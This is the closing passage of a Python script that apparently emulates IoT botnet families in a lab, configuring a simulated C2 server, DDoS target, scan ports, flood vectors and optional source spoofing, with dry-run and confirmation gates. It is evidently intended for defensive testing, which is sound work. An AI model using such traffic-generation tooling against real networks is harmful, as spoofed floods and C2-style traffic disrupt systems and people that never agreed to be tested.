    if unknown:
        tl.die(f"unknown phase(s): {unknown}. Known: {list(PHASES)}")

    src = spoof or tl.local_ip(GATEWAY)
    config_snapshot = {
        "lab_net": LAB_NET, "gateway": GATEWAY, "sim_c2": SIM_C2,
        "c2_http_port": C2_HTTP_PORT, "c2_tcp_port": C2_TCP_PORT,
        "victim": VICTIM, "ddos_target": DDOS_TARGET, "devices": DEVICES,
        "dht_peers": DHT_PEERS, "dht_port": DHT_PORT, "egress_allow": list(EGRESS_ALLOW),
        "scan_ports": prof["scan_ports"], "ddos_vectors": prof["ddos_vectors"],
        "spoof_src": spoof, "seed": a.seed, "neutralised_cmd": NEUTRALISED_CMD,
    }
    ctx = tl.RunContext(
        tool=os.path.basename(__file__), scenario=f"{a.family}:{','.join(order)}",
        fire=a.fire, seed=a.seed, out_dir=a.out, src=src, boundary=boundary,
        config_snapshot=config_snapshot, family=a.family,
    )

    tl.install_sigint()
    print(f"{C.BOLD}IoT family profiles{C.END}  run={ctx.run_id}  family={a.family}  lab={LAB_NET}")
    print(f"{C.Y}{'LIVE - traffic WILL be generated' if a.fire else 'DRY-RUN - prints the plan; add --fire to execute'}{C.END}")
    print(f"{C.DIM}inert emulation: no binary/persistence/replication; neutralised "
          f"exploits; bounded floods; seed={a.seed}; src={src}{C.END}")
    print(f"{C.DIM}phases: {' -> '.join(order)}{C.END}")

    if a.fire:
        tl.confirm_fire(LAB_NET, a.yes)

    ctx.start()
    tl.run_phases(ctx, order, PHASES, BASELINE_GAP, PHASE_SPACING)
    ctx.finish()
    print(f"\n{C.DIM}done.{C.END}")


if __name__ == "__main__":
    main()
